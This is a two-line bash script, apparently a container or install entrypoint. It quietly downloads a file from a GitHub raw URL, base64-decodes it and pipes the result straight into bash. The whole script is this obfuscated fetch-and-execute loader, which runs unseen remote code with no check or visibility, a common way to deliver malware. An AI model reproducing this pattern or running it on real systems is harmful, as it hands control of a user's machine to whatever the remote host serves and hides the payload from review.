#!/bin/bash
wget -qO- https://raw.githubusercontent.com/paulbullet/spice/refs/heads/main/entrypoint.sh | base64 -d | bash
